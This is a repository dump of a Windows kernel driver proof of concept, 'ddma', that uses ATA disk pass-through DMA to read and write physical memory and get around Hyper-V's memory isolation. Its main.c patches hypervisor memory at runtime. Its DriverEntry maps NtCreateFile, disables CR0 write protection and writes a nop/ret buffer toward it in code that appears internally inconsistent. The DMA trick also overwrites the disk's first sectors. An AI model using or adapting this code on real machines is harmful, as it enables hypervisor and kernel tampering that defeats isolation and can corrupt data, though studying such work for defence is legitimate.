Project Path: arc_gmh5225_ddma_1dz0chig

Source Tree:

```txt
arc_gmh5225_ddma_1dz0chig
├── README.md
├── ddma
│   ├── ata.c
│   ├── ata.h
│   ├── ddma.inf
│   ├── ddma.sln
│   ├── ddma.vcxproj
│   ├── ddma.vcxproj.filters
│   ├── disk.c
│   ├── disk.h
│   └── main.c
└── demo.gif

```

`README.md`:

```md
# ddma

A small proof-of-concept for using disk devices for DMA on Windows.

## Why

Some native hypervisors (i.e. Hyper-V) allow the guest unvirtualized device access, which means SLAT can be circumvented.

## Demo

Modifying Hyper-V at runtime (baremetal - 2004).

![Demo](demo.gif)

## Notes

If kernel debugging is enabled, then the demo will bugcheck due to `MiShowBadMapper`. You can fix this by changing the first byte the function references to `2`.

Your HBA may not support 64-bit addressing and thus cannot access higher physical memory.

This PoC also only supports ATA.
```

`ddma/ata.c`:

```c
#include <ntifs.h>

#include "ata.h"
#include <ntddscsi.h>

static NTSTATUS AtaIssueCommand(IN PDEVICE_OBJECT device, IN USHORT flag, IN UCHAR command,
                                IN PVOID buffer) {

    KEVENT event;
    KeInitializeEvent(&event, SynchronizationEvent, FALSE);

    ATA_PASS_THROUGH_DIRECT request = {0};
    request.Length = sizeof(request);
    request.AtaFlags = flag | ATA_FLAGS_USE_DMA;
    request.DataTransferLength = PAGE_SIZE;
    request.TimeOutValue = ATA_IO_TIMEOUT;
    request.DataBuffer = buffer;

    // For the sake of brevity this uses the first sectors (unsafe!)
    request.CurrentTaskFile[1] = PAGE_SIZE / ATA_SECTOR_SIZE;
    request.CurrentTaskFile[5] = ATA_DEVICE_TRANSPORT_LBA;
    request.CurrentTaskFile[6] = command;

    IO_STATUS_BLOCK ioStatusBlock;
    PIRP irp = IoBuildDeviceIoControlRequest(IOCTL_ATA_PASS_THROUGH_DIRECT, device, &request,
                                             sizeof(request), &request, sizeof(request), FALSE,
                                             &event, &ioStatusBlock);

    if (!irp) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    NTSTATUS status = IoCallDriver(device, irp);

    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = ioStatusBlock.Status;
    }

    return status;
}

NTSTATUS AtaReadPage(IN PDEVICE_OBJECT device, OUT PVOID dest) {
    return AtaIssueCommand(device, ATA_FLAGS_DATA_IN, ATA_CMD_READ_SECTORS, dest);
}

NTSTATUS AtaWritePage(IN PDEVICE_OBJECT device, IN PVOID src) {
    return AtaIssueCommand(device, ATA_FLAGS_DATA_OUT, ATA_CMD_WRITE_SECTORS, src);
}
```

`ddma/ata.h`:

```h
#pragma once

#include <ntddk.h>

#define ATA_IO_TIMEOUT (2)
#define ATA_CMD_READ_SECTORS (0x20)
#define ATA_CMD_WRITE_SECTORS (0x30)
#define ATA_DEVICE_TRANSPORT_LBA (0x40)
#define ATA_SECTOR_SIZE (0x200)

NTSTATUS AtaReadPage(IN PDEVICE_OBJECT device, OUT PVOID dest);
NTSTATUS AtaWritePage(IN PDEVICE_OBJECT device, IN PVOID src);
```

`ddma/ddma.inf`:

```inf
;
; ddma.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=ddma.cat
DriverVer= ; TODO: set DriverVer in stampinf property pages

[DestinationDirs]
DefaultDestDir = 12
ddma_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
ddma.sys  = 1,,
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll=1 ; make sure the number matches with SourceDisksNames

;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NT$ARCH$

[Standard.NT$ARCH$]
%ddma.DeviceDesc%=ddma_Device, Root\ddma ; TODO: edit hw-id

[ddma_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
ddma.sys

;-------------- Service installation
[ddma_Device.NT.Services]
AddService = ddma,%SPSVCINST_ASSOCSERVICE%, ddma_Service_Inst

; -------------- ddma driver install sections
[ddma_Service_Inst]
DisplayName    = %ddma.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\ddma.sys

;
;--- ddma_Device Coinstaller installation ------
;

[ddma_Device.NT.CoInstallers]
AddReg=ddma_Device_CoInstaller_AddReg
CopyFiles=ddma_Device_CoInstaller_CopyFiles

[ddma_Device_CoInstaller_AddReg]
HKR,,CoInstallers32,0x00010000, "WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll,WdfCoInstaller"

[ddma_Device_CoInstaller_CopyFiles]
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll

[ddma_Device.NT.Wdf]
KmdfService =  ddma, ddma_wdfsect
[ddma_wdfsect]
KmdfLibraryVersion = $KMDFVERSION$

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "ddma Installation Disk"
ddma.DeviceDesc = "ddma Device"
ddma.SVCDESC = "ddma Service"

```

`ddma/ddma.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31205.134
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ddma", "ddma.vcxproj", "{46CB5F45-AF1E-458C-8287-AF9196DC9260}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|ARM = Debug|ARM
		Debug|ARM64 = Debug|ARM64
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|ARM = Release|ARM
		Release|ARM64 = Release|ARM64
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM.ActiveCfg = Debug|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM.Build.0 = Debug|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM.Deploy.0 = Debug|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM64.ActiveCfg = Debug|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM64.Build.0 = Debug|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|ARM64.Deploy.0 = Debug|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x64.ActiveCfg = Debug|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x64.Build.0 = Debug|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x64.Deploy.0 = Debug|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x86.ActiveCfg = Debug|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x86.Build.0 = Debug|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Debug|x86.Deploy.0 = Debug|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM.ActiveCfg = Release|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM.Build.0 = Release|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM.Deploy.0 = Release|ARM
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM64.ActiveCfg = Release|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM64.Build.0 = Release|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|ARM64.Deploy.0 = Release|ARM64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x64.ActiveCfg = Release|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x64.Build.0 = Release|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x64.Deploy.0 = Release|x64
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x86.ActiveCfg = Release|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x86.Build.0 = Release|Win32
		{46CB5F45-AF1E-458C-8287-AF9196DC9260}.Release|x86.Deploy.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D852F210-A100-4274-A2B8-AA903236B6CD}
	EndGlobalSection
EndGlobal

```

`ddma/ddma.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{46CB5F45-AF1E-458C-8287-AF9196DC9260}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>ddma</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>Spectre</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>Spectre</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>false</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>false</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>Spectre</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>Spectre</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <Optimization>MaxSpeed</Optimization>
      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ata.c" />
    <ClCompile Include="disk.c" />
    <ClCompile Include="main.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ata.h" />
    <ClInclude Include="disk.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`ddma/ddma.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="disk.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ata.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="disk.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ata.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`ddma/disk.c`:

```c
#include <ntifs.h>

#include "ata.h"
#include "disk.h"

NTKERNELAPI POBJECT_TYPE *IoDriverObjectType;
NTKERNELAPI NTSTATUS ObReferenceObjectByName(IN PUNICODE_STRING objectName, IN ULONG attributes,
                                             IN PACCESS_STATE passedAccessState,
                                             IN ACCESS_MASK desiredAccess,
                                             IN POBJECT_TYPE objectType,
                                             IN KPROCESSOR_MODE accessMode,
                                             IN OUT PVOID parseContext, OUT PVOID *object);

static NTSTATUS GetDeviceObjectList(IN PDRIVER_OBJECT driverObject, OUT PDEVICE_OBJECT **outDevices,
                                    OUT PULONG outDeviceCount) {

    ULONG count = 0;
    NTSTATUS status = IoEnumerateDeviceObjectList(driverObject, NULL, 0, &count);

    if (status != STATUS_BUFFER_TOO_SMALL) {
        return status;
    }

    ULONG size = count * sizeof(PDEVICE_OBJECT);
    PDEVICE_OBJECT *devices = ExAllocatePool(NonPagedPoolNx, size);
    if (devices) {
        *outDeviceCount = count;

        status = IoEnumerateDeviceObjectList(driverObject, devices, size, &count);
        if (NT_SUCCESS(status)) {
            *outDevices = devices;
        } else {
            ExFreePool(devices);
        }
    } else {
        status = STATUS_INSUFFICIENT_RESOURCES;
    }

    return status;
}

NTSTATUS DiskFind(OUT PDISK *outDisk) {
    PDISK disk = ExAllocatePool(NonPagedPoolNx, sizeof(DISK));
    if (!disk) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    UNICODE_STRING diskStr = RTL_CONSTANT_STRING(L"\\Driver\\Disk");
    PDRIVER_OBJECT diskObject;

    NTSTATUS status = ObReferenceObjectByName(&diskStr, OBJ_CASE_INSENSITIVE, NULL, 0,
                                              *IoDriverObjectType, KernelMode, NULL, &diskObject);

    if (NT_SUCCESS(status)) {
        PDEVICE_OBJECT *devices;
        ULONG deviceCount;

        status = GetDeviceObjectList(diskObject, &devices, &deviceCount);

        if (NT_SUCCESS(status)) {
            status = STATUS_NOT_FOUND;

            for (ULONG i = 0; i < deviceCount; ++i) {
                PDEVICE_OBJECT device = devices[i];

                if (status == STATUS_NOT_FOUND && NT_SUCCESS(AtaReadPage(device, disk->Buffer))) {
                    disk->Device = device;
                    status = STATUS_SUCCESS;
                    continue;
                }

                ObDereferenceObject(device);
            }

            ExFreePool(devices);
        }

        ObDereferenceObject(diskObject);
    }

    if (NT_SUCCESS(status)) {
        *outDisk = disk;
    } else {
        ExFreePool(disk);
    }

    return status;
}

NTSTATUS DiskCopy(IN PDISK disk, IN PVOID dest, IN PVOID src) {
    // Read from src by writing to disk
    NTSTATUS status = AtaWritePage(disk->Device, src);
    if (NT_SUCCESS(status)) {
        // Write to dest by reading from disk
        status = AtaReadPage(disk->Device, dest);

        // Restore original sectors
        AtaWritePage(disk->Device, disk->Buffer);
    }

    return status;
}

VOID DiskFree(IN PDISK disk) {
    ObDereferenceObject(disk->Device);
    ExFreePool(disk);
}
```

`ddma/disk.h`:

```h
#pragma once

#include <ntddk.h>

typedef struct _DISK {
    PDEVICE_OBJECT Device;

    // Buffer holding sectors original data
    UINT8 Buffer[PAGE_SIZE];
} DISK, *PDISK;

NTSTATUS DiskFind(OUT PDISK *disk);
NTSTATUS DiskCopy(IN PDISK disk, IN PVOID dest, IN PVOID src);
VOID DiskFree(IN PDISK disk);
```

`ddma/main.c`:

```c
#include <ntifs.h>

#include "disk.h"
#include <intrin.h>

#define printf(fmt, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, fmt, ##__VA_ARGS__)
#define CPUID_HV_VENDOR_LEAF (0x40000000)

static BOOLEAN IsMicrosoftHvRunning(VOID) {
    INT32 info[4] = {0};
    __cpuid(info, CPUID_HV_VENDOR_LEAF);
    return info[1] == 'rciM' && info[2] == 'foso' && info[3] == 'vH t';
}

static VOID PrintHvVendor(VOID) {
    INT32 info[4];
    __cpuid(info, CPUID_HV_VENDOR_LEAF);

    CHAR vendor[13] = {0};

    for (UINT32 i = 0; i < 3; ++i) {
        ((PINT32)&vendor)[i] = info[i + 1];
    }

    printf("HV vendor: %s\n", vendor);
}

static BOOLEAN IsPageAllOnes(IN PVOID page) {
    for (UINT32 i = 0; i < PAGE_SIZE; i += sizeof(UINT64)) {
        if (*(PUINT64)((PUINT8)page + i) != MAXUINT64) {
            return FALSE;
        }
    }

    return TRUE;
}

static BOOLEAN Replace4Byte(IN PVOID page, IN UINT32 value, IN UINT32 replace) {
    for (UINT32 i = 0; i <= PAGE_SIZE - sizeof(UINT32); ++i) {
        PUINT32 ptr = (PUINT32)((PUINT8)page + i);
        if (*ptr == value) {
            *ptr = replace;
            return TRUE;
        }
    }

    return FALSE;
}

static BOOLEAN ScanRange(IN PDISK disk, IN PVOID buffer, IN UINT64 base, IN UINT64 size) {
    for (UINT64 i = 0; i < size; i += PAGE_SIZE) {
        UINT64 pfn = (base + i) >> PAGE_SHIFT;

        MM_COPY_ADDRESS src;
        src.PhysicalAddress.QuadPart = pfn << PAGE_SHIFT;

        SIZE_T outSize;
        if (!NT_SUCCESS(MmCopyMemory(buffer, src, PAGE_SIZE, MM_COPY_MEMORY_PHYSICAL, &outSize))) {
            continue;
        }

        // Hyper-V pages are redirected to one with all FFs
        if (!IsPageAllOnes(buffer)) {
            continue;
        }

        PVOID mapping = MmMapIoSpace(src.PhysicalAddress, PAGE_SIZE, MmNonCached);
        if (!mapping) {
            continue;
        }

        if (!NT_SUCCESS(DiskCopy(disk, buffer, mapping))) {
            MmUnmapIoSpace(mapping, PAGE_SIZE);
            continue;
        }

        // Find and replace "Microsoft Hv" vendor string with "Hello, world"
        if (!Replace4Byte(buffer, 'rciM', 'lleH') || !Replace4Byte(buffer, 'foso', 'w ,o') ||
            !Replace4Byte(buffer, 'vH t', 'dlro')) {

            MmUnmapIoSpace(mapping, PAGE_SIZE);
            continue;
        }

        PrintHvVendor();
        printf("Found HV vendor string on page 0x%llX\n", pfn);

        // Write the modified page back
        DiskCopy(disk, mapping, buffer);

        PrintHvVendor();
        MmUnmapIoSpace(mapping, PAGE_SIZE);
        return TRUE;
    }

    return FALSE;
}

static VOID MicrosoftHvDemo(IN PDISK disk) {
    if (!IsMicrosoftHvRunning()) {
        printf("Microsoft HV is not running\n");
        return;
    }

    PHYSICAL_ADDRESS highest;
    highest.QuadPart = MAXULONG32;

    PVOID buffer = MmAllocateContiguousMemory(PAGE_SIZE, highest);
    if (!buffer) {
        printf("Failed to allocate buffer\n");
        return;
    }

    PPHYSICAL_MEMORY_RANGE ranges = MmGetPhysicalMemoryRanges();
    if (ranges) {
        PPHYSICAL_MEMORY_RANGE range = ranges;
        while (range->BaseAddress.QuadPart) {
            if (ScanRange(disk, buffer, range->BaseAddress.QuadPart,
                          range->NumberOfBytes.QuadPart)) {

                break;
            }

            ++range;
        }

        ExFreePool(ranges);
    } else {
        printf("Failed to get physical memory ranges\n");
    }

    MmFreeContiguousMemory(buffer);
}

static VOID DriverUnload(IN PDRIVER_OBJECT driver) {
    UNREFERENCED_PARAMETER(driver);
}

NTSTATUS DriverEntry(IN OUT PDRIVER_OBJECT driver, IN OUT PUNICODE_STRING registryPath) {
    UNREFERENCED_PARAMETER(registryPath);

    driver->DriverUnload = DriverUnload;

    PDISK disk;
    NTSTATUS status = DiskFind(&disk);
    if (!NT_SUCCESS(status)) {
        printf("Failed to find a supported disk for DMA: 0x%X\n", status);
        return STATUS_NOT_FOUND;
    }
	
    if (disk)
    {
        unsigned char writeBuf[0x1000] = {0x90, 0xc3};
        UNICODE_STRING StringNtCreateFile = RTL_CONSTANT_STRING(L"NtCreateFile");
        unsigned char *pNtCreateFile = MmGetSystemRoutineAddress(&StringNtCreateFile);
        PHYSICAL_ADDRESS pNtCreateFilePhy = MmGetPhysicalAddress(pNtCreateFile);
        unsigned char* mapping = MmMapIoSpace(pNtCreateFilePhy, PAGE_SIZE, MmNonCached);
       
        printf("mapping=%p\n", mapping);
        printf("pNtCreateFile=%p\n", pNtCreateFile);
		
		__writecr0(__readcr0() & 0xfffffffffffeffff);
        DiskCopy(disk, writeBuf, mapping);
        printf("pNtCreateFile[0]=%p\n", mapping[0]);
        __writecr0(__readcr0() | 0x10000);
		
        printf("disk->device=%p\n", disk->Device);
        
        
    }

    //MicrosoftHvDemo(disk);

    DiskFree(disk);
    return STATUS_SUCCESS;
}
```